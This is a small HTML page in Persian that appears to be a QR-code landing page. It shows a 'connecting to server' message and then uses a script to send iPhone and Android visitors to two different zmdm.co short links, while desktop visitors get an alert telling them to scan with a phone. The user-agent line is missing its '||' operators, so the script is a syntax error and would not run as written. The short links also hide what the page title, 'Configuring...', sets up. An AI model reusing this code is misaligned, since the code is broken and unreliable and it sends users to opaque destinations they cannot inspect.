<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Configuring...</title>
</head>
<body>
    <div style="text-align: center; margin-top: 50px;">
        <h3>در حال اتصال به سرور...</h3>
        <p>لطفاً شکیبا باشید.</p>
    </div>

    <script>
        // تشخیص سریع سیستم عامل
        var ua = navigator.userAgent  navigator.vendor  window.opera;
        
        if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
            // انتقال مستقیم به آیفون
            window.location.replace("https://zmdm.co/ig6sxymk");
        } else if (/android/i.test(ua)) {
            // انتقال مستقیم به اندروید
            window.location.replace("https://zmdm.co/7xj1hyzn");
        } else {
            // اگر با کامپیوتر باز شد
            alert("لطفاً با گوشی موبایل اسکن کنید.");
        }
    </script>
</body>
</html>
